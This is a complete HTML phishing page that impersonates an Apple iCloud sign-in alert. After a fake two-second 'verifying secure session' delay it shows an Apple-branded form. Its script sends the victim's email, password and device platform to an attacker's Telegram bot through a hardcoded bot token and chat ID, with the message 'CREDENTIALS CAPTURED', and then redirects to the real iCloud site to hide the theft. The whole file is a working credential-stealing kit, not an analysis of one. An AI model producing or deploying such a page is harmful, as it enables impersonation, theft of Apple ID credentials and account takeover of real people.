<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iCloud Security Alert</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { width: 300px; text-align: center; }
        img { width: 80px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #d1d1d1; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 12px; background: #007aff; color: #fff; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
        #loading { display: block; }
        #login-form { display: none; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #007aff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="login-box">
        <div id="loading">
            <div class="loader"></div>
            <p>Verifying secure session...</p>
        </div>

        <div id="login-form">
            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
            <h1>Sign In</h1>
            <p>Confirm your Apple ID to authorize this device.</p>
            <input type="email" id="email" placeholder="Apple ID" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button onclick="sendData()">Sign In</button>
        </div>
    </div>

    <script>
        // 2 second baad loading hatao aur login dikhao
        setTimeout(() => {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('login-form').style.display = 'block';
        }, 2000);

        async function sendData() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            const token = '8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k';
            const chatId = '8639892987';
            
            const msg = `🔓 CREDENTIALS CAPTURED!\n📧 Email: ${email}\n🔑 Password: ${pass}\n📱 Device: ${navigator.platform}`;
            
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
            
            // Data bhejne ke baad asli Apple page par bhej do
            window.location.href = "https://www.icloud.com/";
        }
    </script>
</body>
</html>
